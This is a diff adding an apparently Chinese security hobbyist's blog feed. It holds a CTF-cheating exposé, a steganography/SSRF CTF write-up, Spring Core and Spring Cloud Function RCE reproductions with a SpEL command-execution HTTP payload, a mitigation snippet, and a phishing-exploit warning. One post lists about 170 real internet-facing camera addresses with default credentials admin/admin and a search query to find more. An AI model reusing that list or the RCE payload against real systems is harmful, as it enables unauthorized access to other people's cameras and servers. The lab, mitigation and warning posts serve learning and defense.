@@ -1,0 +1,392 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://chinaran0.github.io/</id>
+    <title>冄老狗</title>
+    <updated>2022-11-19T13:55:49.205Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://chinaran0.github.io/"/>
+    <link rel="self" href="https://chinaran0.github.io/atom.xml"/>
+    <subtitle>不管是什么原因，被禁止永远是一种没有授勋仪式的荣誉。
+——鲍勃・迪伦</subtitle>
+    <logo>https://chinaran0.github.io/images/avatar.png</logo>
+    <icon>https://chinaran0.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, 冄老狗</rights>
+    <entry>
+        <title type="html"><![CDATA[叶子：CTF劳资有手就行，排我前面的都是PY]]></title>
+        <id>https://chinaran0.github.io/post/xie-zi-ctf-lao-zi-you-shou-jiu-xing-pai-wo-qian-mian-de-du-shi-py/</id>
+        <link href="https://chinaran0.github.io/post/xie-zi-ctf-lao-zi-you-shou-jiu-xing-pai-wo-qian-mian-de-du-shi-py/">
+        </link>
+        <updated>2022-11-19T13:46:58.000Z</updated>
+        <content type="html"><![CDATA[<p>今天的投稿是来自CTF比赛方面的</p>
+<p>少年自有凌云志，网安更待少年时，这句话出自ccs极客少年比赛。近年来，网络安全形势日益严峻复杂，特别是电信网络诈骗犯罪已呈高发态势，网络安全教育亟待从青少年抓起。所以就有了今天的主角一位16岁热爱网络安全的男高中生 叶子或者0x11或者A1ph@ ，可能看到这个师傅们很疑惑啊，谁会一下子用三个id？但是没错我们的主角会，（可能是怕py的时候被认出来）看到这，师傅们应该明白了今天的主题，由于他的id过多，所以下面统称py佬，上图看看别人对他的评价<br>
+<img src="https://chinaran0.github.io//post-images/1668865652524.png" alt="" loading="lazy"><br>
+那么这一波我也是将他本该的称号物归原主，自然以佬字辈尊称肯定是在某方面比较权威和精通的人，所以接下来给师傅们讲讲他是如何在py上获得佬字尊称的</p>
+<p>那么又要回到开头所提到的ccs极客少年，是的这是青少年的ctf比赛，那么自然少不了我们的py佬，我们的py佬在比赛开始前就建立了专门的py小群，在比赛中稳定发挥，靠着熟练的人脉搜题法，成功拿下了比赛的第三名，可喜可贺，可是偏偏在这时被人举报了，真是老天无眼啊，我都替他可惜，又错失了装逼的好时机，现在来看一下案发过程，顺带分析一下他的py姿势</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865673981.png" alt="" loading="lazy"><br>
+以一句“在吗”简单开头，顺达尊称一句师傅，让人放下防备</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865683393.png" alt="" loading="lazy"><br>
+在得到他人回应以后以一招开门见山直逼主题，可惜碰壁</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865707646.png" alt="" loading="lazy"><br>
+<img src="https://chinaran0.github.io//post-images/1668865735236.png" alt="" loading="lazy"></p>
+<p>看来我们的py佬也是有学习之心的，在py的同时不忘寻求解题思路</p>
+<figure data-type="image" tabindex="1"><img src="https://chinaran0.github.io//post-images/1668865756808.png" alt="" loading="lazy"></figure>
+<p>Py佬发现直接要flag好像行不通，于是开始阿谀奉承，膜拜大佬，嘲讽自己是废物，其实他不知道，他在py方面的成就远超他人</p>
+<p>最后我们可怜的py佬没有如愿拿到flag还惨遭举报<br>
+<img src="https://chinaran0.github.io//post-images/1668865797747.png" alt="" loading="lazy"><br>
+最终成绩作废，</p>
+<p>我们的py佬在得知成绩作废以后心灰意冷</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865816194.png" alt="" loading="lazy"><br>
+可谁知，在两个月以后他又卷土重来，参加了弱口令实验室招新</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865843803.png" alt="" loading="lazy"><br>
+这一波他直接将别的师傅当做flag提款机疯狂榨干，我们也发现py佬真的名不虚传，只会py，栈溢出都不会，</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865856869.png" alt="" loading="lazy"><br>
+可怜的提款机还蒙在鼓里</p>
+<p>接下来我们的py佬发现有人愿意免费做赛题，狂喜！<br>
+<img src="https://chinaran0.github.io//post-images/1668865892980.jpg" alt="" loading="lazy"><br>
+<img src="https://chinaran0.github.io//post-images/1668865905811.jpg" alt="" loading="lazy"><br>
+这时他排到了第5，但他没有发挥全部实力</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865929986.png" alt="" loading="lazy"><br>
+可以看出py佬的野心很大</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865957266.png" alt="" loading="lazy"><br>
+这时候我们的py佬登顶榜一、恭喜啊，超常发挥了</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865980625.png" alt="" loading="lazy"><br>
+不忘骂一下出题人</p>
+<p><img src="https://chinaran0.github.io//post-images/1668865994060.png" alt="" loading="lazy"><br>
+<img src="https://chinaran0.github.io//post-images/1668866008027.png" alt="" loading="lazy"><br>
+这里可见py佬基础之差，但没事，因为他会py</p>
+<p><img src="https://chinaran0.github.io//post-images/1668866030149.png" alt="" loading="lazy"><br>
+可悲啊，最后还是让主办方知道了，无缘第一，哎，可惜啊</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[信息收集脑图]]></title>
+        <id>https://chinaran0.github.io/post/xin-xi-shou-ji-nao-tu/</id>
+        <link href="https://chinaran0.github.io/post/xin-xi-shou-ji-nao-tu/">
+        </link>
+        <updated>2022-10-31T04:35:31.000Z</updated>
+        <content type="html"><![CDATA[<p>原创，请勿转发泄露<br>
+<img src="https://chinaran0.github.io//post-images/1667190962799.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[玩一波国外摄像头漏洞-174个弱口令]]></title>
+        <id>https://chinaran0.github.io/post/wan-yi-bo-guo-wai-she-xiang-tou-lou-dong-174-ge-ruo-kou-ling/</id>
+        <link href="https://chinaran0.github.io/post/wan-yi-bo-guo-wai-she-xiang-tou-lou-dong-174-ge-ruo-kou-ling/">
+        </link>
+        <updated>2022-07-19T04:35:02.000Z</updated>
+        <content type="html"><![CDATA[<p>本来想挖任意用户添加，然后发现无用，简单看了一下fofa201个目标，弱口令还是挺多的<br>
+用户密码admin/admin<br>
+fofa语句 app=&quot;Finetree-5MP-Network-Camera&quot;<br>
+py脚本 https://github.com/ChinaRan0/Finetree-5MP</p>
+<p>'''<br>
+75.99.238.164:8087<br>
+188.115.19.229:50001<br>
+47.23.144.92:8081<br>
+75.99.238.164:8087<br>
+188.115.19.229:50001<br>
+47.23.144.92:8081<br>
+173.220.221.246:8082<br>
+47.23.163.196:8088<br>
+173.220.245.75:8082<br>
+96.56.55.234:8084<br>
+108.58.221.156:8082<br>
+108.162.59.21:8081<br>
+108.58.221.156:8086<br>
+173.220.221.246:8088<br>
+75.99.230.14:8090<br>
+47.22.158.218:8083<br>
+173.220.245.75:8090<br>
+47.23.145.172:8083<br>
+75.99.228.61:8085<br>
+47.22.158.218:8082<br>
+75.99.238.165:8090<br>
+75.99.225.156:8081<br>
+47.23.163.196:8089<br>
+47.22.138.156:8082<br>
+47.23.136.211:8082<br>
+75.99.225.156:8089<br>
+75.99.230.14:8089<br>
+75.99.238.165:8089<br>
+173.220.245.75:8089<br>
+75.99.225.156:8087<br>
+47.23.163.196:8090<br>
+75.99.228.61:8087<br>
+108.162.59.21:8089<br>
+108.58.209.164:8083<br>
+108.58.221.156:8083<br>
+75.99.229.251:8082<br>
+47.23.144.92:8086<br>
+75.99.230.14:8082<br>
+75.99.229.251:8083<br>
+75.99.230.14:8083<br>
+75.99.238.165:8083<br>
+75.99.238.164:8088<br>
+47.23.163.196:8085<br>
+75.99.238.165:8088<br>
+96.56.77.14:8085<br>
+173.220.245.75:8085<br>
+47.23.144.92:8085<br>
+75.99.229.251:8085<br>
+75.99.230.13:8085<br>
+108.162.59.21:8085<br>
+75.99.238.165:8085<br>
+75.99.230.13:8087<br>
+75.99.229.251:8087<br>
+75.99.238.164:8082<br>
+96.56.77.14:8082<br>
+75.99.238.165:8087<br>
+75.99.230.14:8081<br>
+75.99.228.61:8082<br>
+108.162.59.21:8083<br>
+96.56.55.234:8085<br>
+75.99.230.14:8085<br>
+47.23.136.211:8085<br>
+173.220.221.246:8085<br>
+75.99.225.156:8085<br>
+108.58.209.164:8082<br>
+75.99.238.164:8090<br>
+173.220.204.148:8090<br>
+47.23.144.92:8088<br>
+75.99.225.156:8082<br>
+47.23.145.172:8088<br>
+75.99.229.251:8090<br>
+75.99.230.13:8088<br>
+75.99.230.14:8088<br>
+75.99.229.251:8088<br>
+47.22.138.156:8081<br>
+108.58.221.156:8088<br>
+108.58.221.156:8089<br>
+47.23.144.92:8087<br>
+173.220.245.75:8086<br>
+108.58.221.156:8090<br>
+47.22.158.218:8085<br>
+108.58.221.156:8085<br>
+47.22.138.156:8085<br>
+75.99.228.61:8086<br>
+75.99.228.61:8088<br>
+75.99.225.156:8088<br>
+47.22.138.156:8090<br>
+47.22.158.218:8081<br>
+47.23.136.211:8086<br>
+173.220.221.246:8086<br>
+75.99.230.13:8086<br>
+75.99.230.14:8086<br>
+75.99.229.251:8086<br>
+75.99.238.164:8081<br>
+75.99.238.165:8081<br>
+47.23.145.172:8086<br>
+75.99.225.156:8090<br>
+75.99.225.156:8086<br>
+75.99.230.13:8081<br>
+47.23.144.92:8084<br>
+173.220.245.75:8081<br>
+47.22.138.156:8087<br>
+75.99.238.165:8086<br>
+75.99.238.164:8086<br>
+173.220.245.75:8087<br>
+96.56.77.14:8086<br>
+75.99.230.14:8087<br>
+47.23.136.211:8087<br>
+47.22.138.156:8096<br>
+173.220.221.246:8087<br>
+108.58.221.156:8092<br>
+47.23.145.172:8087<br>
+75.99.238.165:8082<br>
+96.56.77.14:8087<br>
+47.22.158.218:8086<br>
+75.99.230.14:8093<br>
+47.22.138.156:8086<br>
+75.99.225.156:8091<br>
+173.220.221.246:8081<br>
+47.22.138.156:8095<br>
+96.56.55.234:8082<br>
+75.99.238.165:8091<br>
+75.99.238.164:8091<br>
+75.99.230.14:8091<br>
+173.220.245.75:8088<br>
+108.162.59.21:8082<br>
+75.99.238.164:8094<br>
+47.22.158.218:8087<br>
+173.220.245.75:8093<br>
+47.23.163.196:8087<br>
+75.99.238.165:8093<br>
+173.220.204.148:8091<br>
+47.22.158.218:8084<br>
+173.220.245.75:8091<br>
+108.58.209.164:8081<br>
+173.220.221.246:8083<br>
+173.220.245.76:8091<br>
+47.22.138.156:8093<br>
+108.58.221.156:8096<br>
+108.58.221.156:8091<br>
+75.99.230.14:8094<br>
+47.23.145.172:8082<br>
+75.99.238.164:8092<br>
+75.99.238.164:8093<br>
+75.99.238.165:8092<br>
+108.58.221.156:8084<br>
+47.22.138.156:8088<br>
+173.220.245.75:8094<br>
+173.220.245.75:8083<br>
+47.23.163.196:8082<br>
+47.22.138.156:8083<br>
+47.22.138.156:8094<br>
+75.99.238.165:8094<br>
+108.58.221.156:8087<br>
+75.99.238.164:8095<br>
+47.22.138.156:8084<br>
+75.99.230.14:8084<br>
+75.99.230.13:8084<br>
+108.58.221.156:8095<br>
+96.57.241.197:8095<br>
+173.220.245.75:8084<br>
+96.57.241.197:8096<br>
+173.220.245.75:8092<br>
+108.58.221.156:8093<br>
+75.99.238.164:8084<br>
+75.99.225.156:8092<br>
+47.23.136.211:8084<br>
+47.23.163.196:8084<br>
+75.99.229.251:8084<br>
+173.220.245.76:8092<br>
+75.99.225.156:8084<br>
+75.99.230.14:8092<br>
+75.99.238.165:8084<br>
+96.56.77.14:8084</p>
+<p>'''</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[T-Star高校挑战赛]第六题]]></title>
+        <id>https://chinaran0.github.io/post/t-star-gao-xiao-tiao-zhan-sai-di-liu-ti/</id>
+        <link href="https://chinaran0.github.io/post/t-star-gao-xiao-tiao-zhan-sai-di-liu-ti/">
+        </link>
+        <updated>2022-05-06T04:33:03.000Z</updated>
+        <content type="html"><![CDATA[<p>2022-04-25 #CTF<br>
+下载得到guess</p>
+<p>file guess 得到他的格式是word，然后打开，显示隐藏内容，得到：<br>
+<img src="https://chinaran0.github.io//post-images/1667190813950.png" alt="" loading="lazy"><br>
+然后binwalk 出来一张图片<br>
+<img src="https://chinaran0.github.io//post-images/1667190825827.jpg" alt="" loading="lazy"><br>
+不用想，肯定是隐写<br>
+跟据题目guess和已知密钥123456<br>
+有一个图片隐写是outguess，<br>
+git clone https://github.com/crorvick/outguess<br>
+自行下载编译安装<br>
+然后解<br>
+outguess -k 123456 -r image1.jpg text.txt<br>
+<img src="https://chinaran0.github.io//post-images/1667190848983.png" alt="" loading="lazy"><br>
+然后给他拼接起来得到一个新的地址：<br>
+http://175.178.148.197/062ycz7s9458b772e91/webs/<br>
+<img src="https://chinaran0.github.io//post-images/1667190866422.png" alt="" loading="lazy"><br>
+后来我就没继续做，一直没找到flag，后来赛后师傅们写出来文章，md,我差一点就拿到flag了<br>
+flag地址：http://175.178.148.197/062ycz7s9458b772e91/webs/index.php?url=http://127.0.0.2/062ycz7s9458b772e91/webs/flag.php</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] Spring Core RCE复现]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-core-rce-fu-xian/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-core-rce-fu-xian/">
+        </link>
+        <updated>2022-03-31T04:31:53.000Z</updated>
+        <content type="html"><![CDATA[<p>先搞环境：<br>
+sudo docker pull vulfocus/spring-core-rce-2022-03-29<br>
+docker run -d -p 8082:8080 --name corerce -it vulfocus/spring-core-rce-2022-03-29</p>
+<p>EXP已分享到我的github<br>
+https://github.com/ChinaRan0/SpringCoreRCE-EXP-getshell</p>
+<p>然后跑起来本机8082端口<br>
+<img src="https://chinaran0.github.io//post-images/1667190741721.png" alt="" loading="lazy"><br>
+运行exp，得到shell<br>
+<img src="https://chinaran0.github.io//post-images/1667190757289.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] Spring Function RCE漏洞紧急修补建议]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-function-rce-lou-dong-jin-ji-xiu-bu-jian-yi/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-function-rce-lou-dong-jin-ji-xiu-bu-jian-yi/">
+        </link>
+        <updated>2022-03-30T04:31:02.000Z</updated>
+        <content type="html"><![CDATA[<p>在应用系统的项目包下新建以下全局类，并保证这个类被 Spring 加载到(推荐在<br>
+Controller 所在的包中添加)。完成类添加后，需对项目进行重新编译打包和功能验证测试。<br>
+并重新发布项目。<br>
+'<br>
+import org.springframework.core.annotation.Order;<br>
+import org.springframework.web.bind.WebDataBinder;<br>
+import org.springframework.web.bind.annotation.ControllerAdvice;<br>
+import org.springframework.web.bind.annotation.InitBinder;<br>
+@ControllerAdvice<br>
+@Order(10000)<br>
+public class Xttblog{<br>
+@InitBinder<br>
+public void setAllowedFields(WebDataBinder dataBinder) {<br>
+String[] claArr = new String[]{&quot;class.&quot;, &quot;Class.&quot;, &quot;.class.&quot;, &quot;.Class.&quot;};<br>
+dataBinder.setDisallowedFields(claArr);<br>
+}<br>
+}</p>
+<p>'</p>
+<p>别问，core的poc还没出来，通了个大宵了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] Spring function RCE EXP]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-function-rce-exp/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-function-rce-exp/">
+        </link>
+        <updated>2022-03-30T04:30:06.000Z</updated>
+        <content type="html"><![CDATA[<p>复现环境：https://github.com/Pizz33/Spring-Cloud-Function-SpEL<br>
+使用idea新增一个spring lnitializr项目，选择与环境匹配的java版本添加spring web和function右侧栏选择maven-package编译jar包编译完成后运行jar包<br>
+java -jar demo-0.0.1-SNAPSHOT.jar</p>
+<p>POST /functionRouter HTTP/1.1<br>
+Host: 127.0.0.1:8080<br>
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)<br>
+Content-Type: application/x-www-form-urlencoded<br>
+Content-Length: 5</p>
+<p>ran</p>
+<figure data-type="image" tabindex="1"><img src="https://chinaran0.github.io//post-images/1667190631616.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] 警惕，有人利用Spring RCE EXP 钓鱼！]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-jing-ti-you-ren-li-yong-spring-rce-exp-diao-yu/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-jing-ti-you-ren-li-yong-spring-rce-exp-diao-yu/">
+        </link>
+        <updated>2022-03-30T04:28:39.000Z</updated>
+        <content type="html"><![CDATA[<p>假的EXP:<br>
+https://github.com/shakeman8/Spring-Core-RCE</p>
+<p>该exe文件大小是8M左右，经过证实，该文件为针对安全从业人员的钓鱼攻击：</p>
+<p>https://www.virustotal.com/gui/file/45ef7d9efba711af2196fe0d14097293fb0922</p>
+<p>根据NowSec师傅的分析，当前样本执行之后的效果如下：执行之后会读取浏览器保存的用户名、密码和对应URL、然后在C:\Users\Public下创建一个tmp文件，下次再执行，就不会上传(应该是判断这个tmp文件是否存在吧)，删除tmp文件后再执行可以复现。</p>
+<p>最后通过技术手段得到目标ip：84.247.23.128<br>
+好玩的来了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] SpringRCE 应急相应]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-springrce-ying-ji-xiang-ying/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-springrce-ying-ji-xiang-ying/">
+        </link>
+        <updated>2022-03-30T02:27:59.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="https://chinaran0.github.io//post-images/1667190499225.jpg" alt="" loading="lazy"><br>
+<img src="https://chinaran0.github.io//post-images/1667190504357.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[博客同步不成功案例【自我反省】]]></title>
+        <id>https://chinaran0.github.io/post/bo-ke-tong-bu-bu-cheng-gong-an-li-zi-wo-fan-sheng/</id>
+        <link href="https://chinaran0.github.io/post/bo-ke-tong-bu-bu-cheng-gong-an-li-zi-wo-fan-sheng/">
+        </link>
+        <updated>2022-03-13T12:13:26.000Z</updated>
+        <content type="html"><![CDATA[<p>现在的博客是历经了3个月的停更，然后突然想起来，发现我的文件找不到了，所以之前写的博客全都算报废了<br>
+1.重新做配置<br>
+<img src="https://chinaran0.github.io//post-images/1647173728563.png" alt="" loading="lazy"><br>
+我一直以为是GitHub Apps设置Key，然后翻到以前的账号才发现是Personal access tokens</p>
+<p>2.同步问题：<br>
+从网上大神那找到的方案<br>
+从文档里找到Gridea,删除.git文件夹，可以意外的获得成功。</p>
+<p>自我反省：为什么我用了将近两天才找到解决办法<br>
+1.被我自己所知的知识感觉非常自信<br>
+2.在网上找解决方法的时候不自信<br>
+3.只会用自己所学的知识解决问题，不知道闭关锁国会亡国。</p>
+]]></content>
+    </entry>
+</feed>
